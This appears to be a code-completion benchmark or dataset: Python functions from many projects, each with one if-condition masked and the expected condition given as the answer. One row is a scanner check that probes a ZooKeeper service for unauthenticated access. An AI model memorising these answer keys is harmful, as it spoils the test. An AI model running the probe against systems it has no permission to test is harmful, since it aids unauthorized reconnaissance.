3930,"def forward(self, x):<tab>bs = x.size(0)<tab>cur = self.stem(x)<tab>layers = [cur]<tab>for layer_id in range(self.num_layers):<tab><tab>cur = self.layers[layer_id](layers)<tab><tab>layers.append(cur)<tab><tab><IF-STMT><tab><tab><tab>for i, layer in enumerate(layers):<tab><tab><tab><tab>layers[i] = self.pool_layers[self.pool_layers_idx.index(layer_id)](<tab><tab><tab><tab><tab>layer<tab><tab><tab><tab>)<tab><tab><tab>cur = layers[-1]<tab>cur = self.gap(cur).view(bs, -1)<tab>cur = self.dropout(cur)<tab>logits = self.dense(cur)<tab>return logits",if layer_id in self . pool_layers_idx :,198
3931,"def evaluate(self, x, y, z):<tab>vertex = Vector((x, y, z))<tab>nearest, normal, idx, distance = self.bvh.find_nearest(vertex)<tab>if self.use_normal:<tab><tab><IF-STMT><tab><tab><tab>sign = (v - nearest).dot(normal)<tab><tab><tab>sign = copysign(1, sign)<tab><tab>else:<tab><tab><tab>sign = 1<tab><tab>return sign * np.array(normal)<tab>else:<tab><tab>dv = np.array(nearest - vertex)<tab><tab>if self.falloff is not None:<tab><tab><tab>norm = np.linalg.norm(dv)<tab><tab><tab>len = self.falloff(norm)<tab><tab><tab>dv = len * dv<tab><tab><tab>return dv<tab><tab>else:<tab><tab><tab>return dv",if self . signed_normal :,200
3932,"def to_terminal(self):<tab>""""""Yield lines to be printed to a terminal.""""""<tab>for name, mi in self._sort(self.filtered_results):<tab><tab><IF-STMT><tab><tab><tab>yield name, (mi[""error""],), {""error"": True}<tab><tab><tab>continue<tab><tab>rank = mi[""rank""]<tab><tab>color = MI_RANKS[rank]<tab><tab>to_show = """"<tab><tab>if self.config.show:<tab><tab><tab>to_show = "" ({0:.2f})"".format(mi[""mi""])<tab><tab>yield ""{0} - {1}{2}{3}{4}"", (name, color, rank, to_show, RESET), {}","if ""error"" in mi :",163
3933,"def _get_widget_by_name(self, container, name):<tab>""""""Recursively search to return the named child widget.""""""<tab>LOGGER.log()<tab>children = container.get_children()<tab>for child in children:<tab><tab>if child.name == name:<tab><tab><tab>return child<tab><tab>if isinstance(child, gtk.Container):<tab><tab><tab>found_child = self._get_widget_by_name(child, name)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return found_child",if found_child :,122
3934,"def PyJsHoisted_hasComputed_(mutatorMap, this, arguments, var=var):<tab>var = Scope(<tab><tab>{u""this"": this, u""arguments"": arguments, u""mutatorMap"": mutatorMap}, var<tab>)<tab>var.registers([u""mutatorMap"", u""key""])<tab>for PyJsTemp in var.get(u""mutatorMap""):<tab><tab>var.put(u""key"", PyJsTemp)<tab><tab><IF-STMT><tab><tab><tab>return var.get(u""true"")<tab>return Js(False)","if var . get ( u""mutatorMap"" ) . get ( var . get ( u""key"" ) ) . get ( u""_computed"" ) :",158
3935,"def get_result_json_path(self):<tab>if self._result_json_path is None:<tab><tab><IF-STMT><tab><tab><tab>self._result_json_path = get_unique_file(<tab><tab><tab><tab>self.path,<tab><tab><tab><tab>PARALLEL_RESULT_JSON_PREFIX,<tab><tab><tab><tab>PARALLEL_RESULT_JSON_SUFFIX,<tab><tab><tab>)<tab>return self._result_json_path",if self . envconfig . config . option . resultjson :,113
3936,"def timer(ratio, step, additive):<tab>t = 0<tab>slowmode = False<tab>while 1:<tab><tab>if additive:<tab><tab><tab>slowmode |= bool((yield t))<tab><tab>else:<tab><tab><tab>slowmode = bool((yield t))<tab><tab><IF-STMT><tab><tab><tab>t += step * ratio<tab><tab>else:<tab><tab><tab>t += step",if slowmode :,89
3937,"def _split_long_text(text, idx, size):<tab>splited_text = text.split()<tab>if len(splited_text) > 25:<tab><tab>if idx == 0:<tab><tab><tab># The first is (...)text<tab><tab><tab>first = """"<tab><tab>else:<tab><tab><tab>first = "" "".join(splited_text[:10])<tab><tab><IF-STMT><tab><tab><tab># The last is text(...)<tab><tab><tab>last = """"<tab><tab>else:<tab><tab><tab>last = "" "".join(splited_text[-10:])<tab><tab>return ""{}(...){}"".format(first, last)<tab>return text",if idx != 0 and idx == size - 1 :,156
3938,"def test_tag_priority(self):<tab>for tag in _low_priority_D_TAG:<tab><tab>val = ENUM_D_TAG[tag]<tab><tab># if the low priority tag is present in the descriptions,<tab><tab># assert that it has not overridden any other tag<tab><tab><IF-STMT><tab><tab><tab>for tag2 in ENUM_D_TAG:<tab><tab><tab><tab>if tag2 == tag:<tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>self.assertNotEqual(ENUM_D_TAG[tag2], val)",if _DESCR_D_TAG [ val ] == tag :,135
3939,"def _concretize(self, n_cls, t1, t2, join_or_meet, translate):<tab>ptr_class = self._pointer_class()<tab>if n_cls is ptr_class:<tab><tab><IF-STMT><tab><tab><tab># we need to merge them<tab><tab><tab>return ptr_class(join_or_meet(t1.basetype, t2.basetype, translate))<tab><tab>if isinstance(t1, ptr_class):<tab><tab><tab>return t1<tab><tab>elif isinstance(t2, ptr_class):<tab><tab><tab>return t2<tab><tab>else:<tab><tab><tab># huh?<tab><tab><tab>return ptr_class(BottomType())<tab>return n_cls()","if isinstance ( t1 , ptr_class ) and isinstance ( t2 , ptr_class ) :",181
3940,"def parse(self, html: HTML) -> [ProxyIP]:<tab>ip_list: [ProxyIP] = []<tab>for ip_row in html.find(""table.proxytbl tr""):<tab><tab>ip_element = ip_row.find(""td:nth-child(1)"", first=True)<tab><tab>port_element = ip_row.find(""td:nth-child(2)"", first=True)<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>port_str = re.search(r""//]]> (\d+)"", port_element.text).group(1)<tab><tab><tab><tab>p = ProxyIP(ip=ip_element.text, port=port_str)<tab><tab><tab><tab>ip_list.append(p)<tab><tab>except AttributeError:<tab><tab><tab>pass<tab>return ip_list",if ip_element and port_element :,197
3941,"def _reformat(self):<tab>document = self.suggestions.document()<tab>cursor = self.suggestions.textCursor()<tab>block = document.begin()<tab>style_format = {<tab><tab>self.STYLE_TRANSLATION: self._translation_char_format,<tab><tab>self.STYLE_STROKES: self._strokes_char_format,<tab>}<tab>while block != document.end():<tab><tab>style = block.userState()<tab><tab>fmt = style_format.get(style)<tab><tab><IF-STMT><tab><tab><tab>cursor.setPosition(block.position())<tab><tab><tab>cursor.select(QTextCursor.BlockUnderCursor)<tab><tab><tab>cursor.setCharFormat(fmt)<tab><tab>block = block.next()",if fmt is not None :,174
3942,"def check_uncore_event(e):<tab>if uncore_exists(e.unit):<tab><tab><IF-STMT><tab><tab><tab>warn_once(""Uncore unit "" + e.unit + "" missing cmask for "" + e.name)<tab><tab><tab>return None<tab><tab>if e.umask and not uncore_exists(e.unit, ""/format/umask""):<tab><tab><tab>warn_once(""Uncore unit "" + e.unit + "" missing umask for "" + e.name)<tab><tab><tab>return None<tab><tab>return e<tab>if e.unit not in missing_boxes:<tab><tab>warn_once(""Uncore unit "" + e.unit + "" missing"")<tab><tab>missing_boxes.add(e.unit)<tab>return None","if e . cmask and not uncore_exists ( e . unit , ""/format/cmask"" ) :",192
3943,"def check(ip, port, timeout):<tab>try:<tab><tab>socket.setdefaulttimeout(timeout)<tab><tab>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<tab><tab>s.connect((ip, int(port)))<tab><tab>flag = ""envi""<tab><tab># envi<tab><tab># dump<tab><tab># reqs<tab><tab># ruok<tab><tab># stat<tab><tab>s.send(flag)<tab><tab>data = s.recv(1024)<tab><tab>s.close()<tab><tab><IF-STMT><tab><tab><tab>return u""Zookeeper Unauthorized access""<tab>except:<tab><tab>pass","if ""Environment"" in data :",154
3944,"def getid(self):<tab>uid = u""""<tab>try:<tab><tab>filename = (<tab><tab><tab>self.xmlelement.iterancestors(self.namespaced(""file""))<tab><tab><tab>.next()<tab><tab><tab>.get(""original"")<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>uid = filename + ID_SEPARATOR<tab>except StopIteration:<tab><tab># unit has no proper file ancestor, probably newly created<tab><tab>pass<tab># hide the fact that we sanitize ID_SEPERATOR<tab>uid += unicode(self.xmlelement.get(""id"") or u"""").replace(<tab><tab>ID_SEPARATOR_SAFE, ID_SEPARATOR<tab>)<tab>return uid",if filename :,164
3945,"def identify(self, vivisect_workspace, function_vas):<tab>candidate_functions = {}<tab>for fva in function_vas:<tab><tab>fname = vivisect_workspace.getName(fva)<tab><tab>default_name = ""sub_%.8x"" % fva<tab><tab><IF-STMT><tab><tab><tab>self.d(""Identified %s at VA 0x%08X "" % (fname, fva))<tab><tab><tab>candidate_functions[fva] = True<tab>return candidate_functions",if fname != default_name :,123
3946,"def nud(self):<tab>self.first = []<tab>comma = False<tab>if self.token.id != "")"":<tab><tab>while 1:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>self.first.append(self.expression())<tab><tab><tab>if self.token.id == "","":<tab><tab><tab><tab>comma = True<tab><tab><tab><tab>self.advance("","")<tab><tab><tab>else:<tab><tab><tab><tab>break<tab>self.advance("")"")<tab>if not self.first or comma:<tab><tab>return self  # tuple<tab>else:<tab><tab>return self.first[0]","if self . token . id == "")"" :",146
3947,"def allow_syncdb(self, db, model):<tab>for router in self.routers:<tab><tab>try:<tab><tab><tab>method = router.allow_syncdb<tab><tab>except AttributeError:<tab><tab><tab># If the router doesn't have a method, skip to the next one.<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>allow = method(db, model)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return allow<tab>return True",if allow is not None :,110
3948,"def status_string(self):<tab>if not self.live:<tab><tab>if self.expired:<tab><tab><tab>return _(""expired"")<tab><tab>elif self.approved_schedule:<tab><tab><tab>return _(""scheduled"")<tab><tab><IF-STMT><tab><tab><tab>return _(""in moderation"")<tab><tab>else:<tab><tab><tab>return _(""draft"")<tab>else:<tab><tab>if self.approved_schedule:<tab><tab><tab>return _(""live + scheduled"")<tab><tab>elif self.workflow_in_progress:<tab><tab><tab>return _(""live + in moderation"")<tab><tab>elif self.has_unpublished_changes:<tab><tab><tab>return _(""live + draft"")<tab><tab>else:<tab><tab><tab>return _(""live"")",elif self . workflow_in_progress :,166
3949,"def _on_config_changed(changed_name: str) -> None:<tab>""""""Call config_changed hooks if the config changed.""""""<tab>for mod_info in _module_infos:<tab><tab>if mod_info.skip_hooks:<tab><tab><tab>continue<tab><tab>for option, hook in mod_info.config_changed_hooks:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>hook()<tab><tab><tab>else:<tab><tab><tab><tab>cfilter = config.change_filter(option)<tab><tab><tab><tab>cfilter.validate()<tab><tab><tab><tab>if cfilter.check_match(changed_name):<tab><tab><tab><tab><tab>hook()",if option is None :,151
3950,"def test_slowest_interrupted(self):<tab># Issue #25373: test --slowest with an interrupted test<tab>code = TEST_INTERRUPTED<tab>test = self.create_test(""sigint"", code=code)<tab>for multiprocessing in (False, True):<tab><tab>with self.subTest(multiprocessing=multiprocessing):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>args = (""--slowest"", ""-j2"", test)<tab><tab><tab>else:<tab><tab><tab><tab>args = (""--slowest"", test)<tab><tab><tab>output = self.run_tests(*args, exitcode=130)<tab><tab><tab>self.check_executed_tests(output, test, omitted=test, interrupted=True)<tab><tab><tab>regex = ""10 slowest tests:\n""<tab><tab><tab>self.check_line(output, regex)",if multiprocessing :,190
3951,"def insert_files(self, urls, pos):<tab>""""""Not only images""""""<tab>image_extensions = ["".png"", "".jpg"", "".bmp"", "".gif""]<tab>for url in urls:<tab><tab><IF-STMT><tab><tab><tab>path = url.path()<tab><tab><tab>ext = os.path.splitext(path)[1]<tab><tab><tab>if os.path.exists(path) and ext in image_extensions:<tab><tab><tab><tab>self._insert_image_from_path(path)<tab><tab><tab>else:<tab><tab><tab><tab>self.parent.resource_edit.add_attach(path)","if url . scheme ( ) == ""file"" :",144
3952,"def _model_shorthand(self, args):<tab>accum = []<tab>for arg in args:<tab><tab>if isinstance(arg, Node):<tab><tab><tab>accum.append(arg)<tab><tab>elif isinstance(arg, Query):<tab><tab><tab>accum.append(arg)<tab><tab><IF-STMT><tab><tab><tab>accum.extend(arg.get_proxy_fields())<tab><tab>elif isclass(arg) and issubclass(arg, Model):<tab><tab><tab>accum.extend(arg._meta.declared_fields)<tab>return accum","elif isinstance ( arg , ModelAlias ) :",125
3953,"def get_identifiers(self):<tab>ids = []<tab>ifaces = [i[""name""] for i in self.middleware.call_sync(""interface.query"")]<tab>for entry in glob.glob(f""{self._base_path}/interface-*""):<tab><tab>ident = entry.rsplit(""-"", 1)[-1]<tab><tab>if ident not in ifaces:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>ids.append(ident)<tab>ids.sort(key=RRDBase._sort_disks)<tab>return ids","if os . path . exists ( os . path . join ( entry , ""if_octets.rrd"" ) ) :",143
3954,"def _validate_required_settings(<tab>self, application_id, application_config, required_settings, should_throw=True):<tab>""""""All required keys must be present""""""<tab>for setting_key in required_settings:<tab><tab><IF-STMT><tab><tab><tab>if should_throw:<tab><tab><tab><tab>raise ImproperlyConfigured(<tab><tab><tab><tab><tab>MISSING_SETTING.format(<tab><tab><tab><tab><tab><tab>application_id=application_id, setting=setting_key<tab><tab><tab><tab><tab>)<tab><tab><tab><tab>)<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab>return True",if setting_key not in application_config . keys ( ) :,146
3955,"def digests():<tab>if not OpenVPN.DIGESTS:<tab><tab>proc = subprocess.Popen(<tab><tab><tab>[""openvpn"", ""--show-digests""],<tab><tab><tab>stdout=subprocess.PIPE,<tab><tab><tab>stderr=subprocess.PIPE,<tab><tab>)<tab><tab>stdout, stderr = proc.communicate()<tab><tab><IF-STMT><tab><tab><tab>OpenVPN.DIGESTS = {<tab><tab><tab><tab>v.split("" "")[0].strip(): v.split("" "", 1)[1].strip()<tab><tab><tab><tab>for v in filter(<tab><tab><tab><tab><tab>lambda v: v and v.endswith(""bit digest size""),<tab><tab><tab><tab><tab>stdout.decode(""utf8"").split(""\n""),<tab><tab><tab><tab>)<tab><tab><tab>}<tab>return OpenVPN.DIGESTS",if not proc . returncode :,188
3956,"def iterate_demo_dirs(dir_name, env_name):<tab>for env_file_name in glob.glob(<tab><tab>os.path.join(dir_name, ""**"", ""env_id.txt""), recursive=True<tab>):<tab><tab>with open(env_file_name, ""r"", encoding=""utf-8"") as fd:<tab><tab><tab>dir_env_name = fd.readline()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab>yield os.path.dirname(env_file_name)",if dir_env_name != env_name :,132
3957,"def validate_rights(namespace):<tab>if ""Manage"" in namespace.rights:<tab><tab><IF-STMT><tab><tab><tab>raise CLIError(<tab><tab><tab><tab>""Error : Assigning 'Manage' to --rights requires 'Listen' and 'Send' to be included with. e.g. --rights Manage Send Listen""<tab><tab><tab>)","if ""Listen"" not in namespace . rights or ""Send"" not in namespace . rights :",95
3958,"def apply_patches(ctx, patched=False, pre=False):<tab>if patched:<tab><tab>vendor_dir = _get_patched_dir(ctx)<tab>else:<tab><tab>vendor_dir = _get_vendor_dir(ctx)<tab>log(""Applying pre-patches..."")<tab>patch_dir = Path(__file__).parent / ""patches"" / vendor_dir.name<tab>if pre:<tab><tab><IF-STMT><tab><tab><tab>pass<tab><tab>for patch in patch_dir.glob(""*.patch""):<tab><tab><tab>if not patch.name.startswith(""_post""):<tab><tab><tab><tab>apply_patch(ctx, patch)<tab>else:<tab><tab>patches = patch_dir.glob(""*.patch"" if not patched else ""_post*.patch"")<tab><tab>for patch in patches:<tab><tab><tab>apply_patch(ctx, patch)",if not patched :,191
3959,"def log_sock(s, event_type=None):<tab>if sock_silent:<tab><tab>pass<tab>else:<tab><tab><IF-STMT><tab><tab><tab>logsocket.sendto(ensure_str(s), (host, port))<tab><tab>elif event_type in show_event:<tab><tab><tab>logsocket.sendto(ensure_str(s), (host, port))<tab><tab>else:<tab><tab><tab>pass",if event_type is None :,103
3960,"def replace_params(<tab>path: str,<tab>param_convertors: typing.Dict[str, Convertor],<tab>path_params: typing.Dict[str, str],) -> typing.Tuple[str, dict]:<tab>for key, value in list(path_params.items()):<tab><tab><IF-STMT><tab><tab><tab>convertor = param_convertors[key]<tab><tab><tab>value = convertor.to_string(value)<tab><tab><tab>path = path.replace(""{"" + key + ""}"", value)<tab><tab><tab>path_params.pop(key)<tab>return path, path_params","if ""{"" + key + ""}"" in path :",145
3961,"def data(self, index: QModelIndex, role=Qt.DisplayRole):<tab>if not index.isValid():<tab><tab>return None<tab>if role == Qt.DisplayRole or role == Qt.EditRole:<tab><tab>i = index.row()<tab><tab>j = index.column()<tab><tab>fieldtype = self.field_types[i]<tab><tab>if j == 0:<tab><tab><tab>return fieldtype.caption<tab><tab>elif j == 1:<tab><tab><tab>return fieldtype.function.name<tab><tab><IF-STMT><tab><tab><tab>return ProtocolLabel.DISPLAY_FORMATS[fieldtype.display_format_index]",elif j == 2 :,142
3962,"def delta_page(self, x: float = 0.0, y: float = 0.0) -> None:<tab>if y.is_integer():<tab><tab>y = int(y)<tab><tab>if y == 0:<tab><tab><tab>pass<tab><tab>elif y < 0:<tab><tab><tab>self.page_up(count=-y)<tab><tab><IF-STMT><tab><tab><tab>self.page_down(count=y)<tab><tab>y = 0<tab>if x == 0 and y == 0:<tab><tab>return<tab>size = self._widget.page().mainFrame().geometry()<tab>self.delta(int(x * size.width()), int(y * size.height()))",elif y > 0 :,160
3963,"def _process_symbols(self, tokens):<tab>opening_paren = False<tab>for index, token, value in tokens:<tab><tab><IF-STMT><tab><tab><tab>token = self.MAPPINGS.get(value, Name.Function)<tab><tab>elif token == Literal and value in self.BUILTINS_ANYWHERE:<tab><tab><tab>token = Name.Builtin<tab><tab>opening_paren = value == ""("" and token == Punctuation<tab><tab>yield index, token, value","if opening_paren and token in ( Literal , Name . Variable ) :",115
3964,"def ext_service(self, entity_id, typ, service, binding=None):<tab>known_entity = False<tab>for key, _md in self.metadata.items():<tab><tab>srvs = _md.ext_service(entity_id, typ, service, binding)<tab><tab><IF-STMT><tab><tab><tab>return srvs<tab><tab>elif srvs is None:<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>known_entity = True<tab>if known_entity:<tab><tab>raise UnsupportedBinding(binding)<tab>else:<tab><tab>raise UnknownSystemEntity(entity_id)",if srvs :,138
3965,"def find_library_nt(name):<tab># modified from ctypes.util<tab># ctypes.util.find_library just returns first result he found<tab># but we want to try them all<tab># because on Windows, users may have both 32bit and 64bit version installed<tab>results = []<tab>for directory in os.environ[""PATH""].split(os.pathsep):<tab><tab>fname = os.path.join(directory, name)<tab><tab><IF-STMT><tab><tab><tab>results.append(fname)<tab><tab>if fname.lower().endswith("".dll""):<tab><tab><tab>continue<tab><tab>fname = fname + "".dll""<tab><tab>if os.path.isfile(fname):<tab><tab><tab>results.append(fname)<tab>return results",if os . path . isfile ( fname ) :,174
3966,"def getRemovedFiles(oldContents, newContents, destinationFolder):<tab>toRemove = []<tab>for filename in list(oldContents.keys()):<tab><tab>if filename not in newContents:<tab><tab><tab>destFile = os.path.join(destinationFolder, filename.lstrip(""/""))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>toRemove.append(filename)<tab>return toRemove",if os . path . isfile ( destFile ) :,95
3967,"def escapeall(self, lines):<tab>""Escape all lines in an array according to the output options.""<tab>result = []<tab>for line in lines:<tab><tab><IF-STMT><tab><tab><tab>line = self.escape(line, EscapeConfig.html)<tab><tab>if Options.iso885915:<tab><tab><tab>line = self.escape(line, EscapeConfig.iso885915)<tab><tab><tab>line = self.escapeentities(line)<tab><tab>elif not Options.unicode:<tab><tab><tab>line = self.escape(line, EscapeConfig.nonunicode)<tab><tab>result.append(line)<tab>return result",if Options . html :,143
3968,"def body(self):<tab>order = [<tab><tab>""ok_header"",<tab><tab>""affected_rows"",<tab><tab>""last_insert_id"",<tab><tab>""server_status"",<tab><tab>""warning_count"",<tab><tab>""state_track"",<tab><tab>""info"",<tab>]<tab>string = b""""<tab>for key in order:<tab><tab>item = getattr(self, key)<tab><tab>section_pack = b""""<tab><tab>if item is None:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>section_pack = item<tab><tab>else:<tab><tab><tab>section_pack = getattr(self, key).toStringPacket()<tab><tab>string += section_pack<tab>self.setBody(string)<tab>return self._body","elif isinstance ( item , bytes ) :",182
3969,"def _get_instantiation(self):<tab>if self._data is None:<tab><tab>f, l, c, o = c_object_p(), c_uint(), c_uint(), c_uint()<tab><tab>conf.lib.clang_getInstantiationLocation(<tab><tab><tab>self, byref(f), byref(l), byref(c), byref(o)<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>f = File(f)<tab><tab>else:<tab><tab><tab>f = None<tab><tab>self._data = (f, int(l.value), int(c.value), int(o.value))<tab>return self._data",if f :,152
3970,"def analyze_items(items, category_id, agg_data):<tab>for item in items:<tab><tab><IF-STMT><tab><tab><tab>agg_data[""cat_asp""][category_id] = []<tab><tab>agg_data[""cat_asp""][category_id].append(<tab><tab><tab>float(item.sellingStatus.currentPrice.value)<tab><tab>)<tab><tab>if getattr(item.listingInfo, ""watchCount"", None):<tab><tab><tab>agg_data[""watch_count""] += int(item.listingInfo.watchCount)<tab><tab>if getattr(item, ""postalCode"", None):<tab><tab><tab>agg_data[""postal_code""] = item.postalCode","if not agg_data [ ""cat_asp"" ] . get ( category_id , None ) :",169
3971,"def mock_default_data_dir(tmp_path: pathlib.Path):<tab>""""""Changes the default `--data_dir` to tmp_path.""""""<tab>tmp_path = tmp_path / ""datasets""<tab>default_data_dir = os.environ.get(""TFDS_DATA_DIR"")<tab>try:<tab><tab>os.environ[""TFDS_DATA_DIR""] = os.fspath(tmp_path)<tab><tab>yield tmp_path<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>os.environ[""TFDS_DATA_DIR""] = default_data_dir<tab><tab>else:<tab><tab><tab>del os.environ[""TFDS_DATA_DIR""]",if default_data_dir :,158
3972,"def has_valid_checksum(self, number):<tab>given_number, given_checksum = number[:-1], number[-1]<tab>calculated_checksum = 0<tab>parameter = 7<tab>for item in given_number:<tab><tab>fragment = str(int(item) * parameter)<tab><tab><IF-STMT><tab><tab><tab>calculated_checksum += int(fragment[-1])<tab><tab>if parameter == 1:<tab><tab><tab>parameter = 7<tab><tab>elif parameter == 3:<tab><tab><tab>parameter = 1<tab><tab>elif parameter == 7:<tab><tab><tab>parameter = 3<tab>return str(calculated_checksum)[-1] == given_checksum",if fragment . isalnum ( ) :,147
3973,"def _cleanup_volumes(self, context, instance_id):<tab>bdms = self.db.block_device_mapping_get_all_by_instance(context, instance_id)<tab>for bdm in bdms:<tab><tab>LOG.debug(_(""terminating bdm %s"") % bdm)<tab><tab><IF-STMT><tab><tab><tab>volume = self.volume_api.get(context, bdm[""volume_id""])<tab><tab><tab>self.volume_api.delete(context, volume)","if bdm [ ""volume_id"" ] and bdm [ ""delete_on_termination"" ] :",130
3974,"def _split_zipped_payload(self, packet_bunch):<tab>""""""Split compressed payload""""""<tab>while packet_bunch:<tab><tab><IF-STMT><tab><tab><tab>payload_length = struct.unpack_from(""<I"", packet_bunch[0:3] + b""\x00"")[<tab><tab><tab><tab>0<tab><tab><tab>]  # pylint: disable=E0602<tab><tab>else:<tab><tab><tab>payload_length = struct.unpack(""<I"", packet_bunch[0:3] + b""\x00"")[0]<tab><tab>self._packet_queue.append(packet_bunch[0 : payload_length + 4])<tab><tab>packet_bunch = packet_bunch[payload_length + 4 :]",if PY2 :,169
3975,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab><IF-STMT><tab><tab><tab>self.set_application_key(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 18:<tab><tab><tab>self.set_message(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 26:<tab><tab><tab>self.set_tag(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 10 :,152
3976,"def update_transitive(self, conanfile):<tab>transitive = getattr(conanfile, ""python_requires"", None)<tab>if not transitive:<tab><tab>return<tab>for name, transitive_py_require in transitive.all_items():<tab><tab>existing = self._pyrequires.get(name)<tab><tab><IF-STMT><tab><tab><tab>raise ConanException(<tab><tab><tab><tab>""Conflict in py_requires %s - %s""<tab><tab><tab><tab>% (existing.ref, transitive_py_require.ref)<tab><tab><tab>)<tab><tab>self._transitive[name] = transitive_py_require",if existing and existing . ref != transitive_py_require . ref :,153
3977,"def call(cls, func, *args):<tab>try:<tab><tab>f = cls._func_cache[func]<tab>except KeyError:<tab><tab><IF-STMT><tab><tab><tab>f = cls._func_cache[func] = getattr(vim.funcs, func)<tab><tab>else:<tab><tab><tab>f = cls._func_cache[func] = vim.Function(func)<tab>return f(*args)",if IS_NVIM :,100
3978,"def __call__(self, *args, **kwargs):<tab>if self is S:<tab><tab>if args:<tab><tab><tab>raise TypeError(""S() takes no positional arguments, got: %r"" % (args,))<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(""S() expected at least one kwarg, got none"")<tab><tab># TODO: typecheck kwarg vals?<tab>return _t_child(self, ""("", (args, kwargs))",if not kwargs :,101
3979,"def tiles_around_factor(self, factor, pos, radius=1, predicate=None):<tab>ps = []<tab>x, y = pos<tab>for dx in range(-radius, radius + 1):<tab><tab>nx = x + dx<tab><tab>if nx >= 0 and nx < self.width * factor:<tab><tab><tab>for dy in range(-radius, radius + 1):<tab><tab><tab><tab>ny = y + dy<tab><tab><tab><tab>if ny >= 0 and ny < self.height * factor and (dx != 0 or dy != 0):<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>ps.append((nx, ny))<tab>return ps","if predicate is None or predicate ( ( nx , ny ) ) :",159
3980,"def _plugin_get_requirements(self, requirements_iter):<tab>plugin_requirements = {""platform"": [], ""python"": [], ""network"": [], ""native"": []}<tab># parse requirements<tab>for requirement in requirements_iter:<tab><tab>key = requirement[0]<tab><tab>values = requirement[1]<tab><tab><IF-STMT><tab><tab><tab>values = [values]<tab><tab>if key in plugin_requirements:<tab><tab><tab>plugin_requirements[key].extend(values)<tab><tab>else:<tab><tab><tab>warning(""{}={}: No supported requirement"".format(key, values))<tab>return plugin_requirements","if isinstance ( values , str ) or isinstance ( values , bool ) :",148
3981,"def test_engine_api_sdl(sdl, expected, pass_to, clean_registry):<tab>from tartiflette import Engine<tab>if pass_to == ""engine"":<tab><tab>e = Engine(sdl)<tab>else:<tab><tab>e = Engine()<tab>if isinstance(expected, Exception):<tab><tab>with pytest.raises(Exception):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>await e.cook(sdl)<tab><tab><tab>else:<tab><tab><tab><tab>await e.cook()<tab>else:<tab><tab>if pass_to == ""cook"":<tab><tab><tab>await e.cook(sdl)<tab><tab>else:<tab><tab><tab>await e.cook()<tab><tab>assert e._schema is not None","if pass_to == ""cook"" :",175
3982,"def update(self, other_dict, option_parser):<tab>if isinstance(other_dict, Values):<tab><tab>other_dict = other_dict.__dict__<tab>other_dict = other_dict.copy()<tab>for setting in option_parser.lists.keys():<tab><tab>if hasattr(self, setting) and setting in other_dict:<tab><tab><tab>value = getattr(self, setting)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>value += other_dict[setting]<tab><tab><tab><tab>del other_dict[setting]<tab>self._update_loose(other_dict)",if value :,137
3983,"def _cast_Time(iso, curs):<tab>if iso:<tab><tab><IF-STMT><tab><tab><tab>return iso<tab><tab>else:<tab><tab><tab>return DateTime(<tab><tab><tab><tab>time.strftime(<tab><tab><tab><tab><tab>""%Y-%m-%d %H:%M:%S"",<tab><tab><tab><tab><tab>time.localtime(time.time())[:3]<tab><tab><tab><tab><tab>+ time.strptime(iso[:8], ""%H:%M:%S"")[3:],<tab><tab><tab><tab>)<tab><tab><tab>)","if iso in [ ""-infinity"" , ""infinity"" ] :",125
3984,"def _get_default_urlpatterns(self):<tab>package_string = ""."".join(self.__module__.split(""."")[:-1])<tab>if getattr(self, ""urls"", None):<tab><tab>try:<tab><tab><tab>mod = import_module("".%s"" % self.urls, package_string)<tab><tab>except ImportError:<tab><tab><tab>mod = import_module(self.urls)<tab><tab>urlpatterns = mod.urlpatterns<tab>else:<tab><tab># Try importing a urls.py from the dashboard package<tab><tab><IF-STMT><tab><tab><tab>urls_mod = import_module("".urls"", package_string)<tab><tab><tab>urlpatterns = urls_mod.urlpatterns<tab><tab>else:<tab><tab><tab>urlpatterns = patterns("""")<tab>return urlpatterns","if module_has_submodule ( import_module ( package_string ) , ""urls"" ) :",180
3985,"def escape2null(text):<tab>""""""Return a string with escape-backslashes converted to nulls.""""""<tab>parts = []<tab>start = 0<tab>while 1:<tab><tab>found = text.find(""\\"", start)<tab><tab><IF-STMT><tab><tab><tab>parts.append(text[start:])<tab><tab><tab>return """".join(parts)<tab><tab>parts.append(text[start:found])<tab><tab>parts.append(""\x00"" + text[found + 1 : found + 2])<tab><tab>start = found + 2  # skip character after escape",if found == - 1 :,129
3986,"def check(self, obj):<tab>if ""*"" in self.states:<tab><tab>return {""state"": self.dispatcher.current_state()}<tab>try:<tab><tab>state = self.ctx_state.get()<tab>except LookupError:<tab><tab>chat, user = self.get_target(obj)<tab><tab>if chat or user:<tab><tab><tab>state = await self.dispatcher.storage.get_state(chat=chat, user=user)<tab><tab><tab>self.ctx_state.set(state)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return {""state"": self.dispatcher.current_state(), ""raw_state"": state}<tab>else:<tab><tab>if state in self.states:<tab><tab><tab>return {""state"": self.dispatcher.current_state(), ""raw_state"": state}<tab>return False",if state in self . states :,192
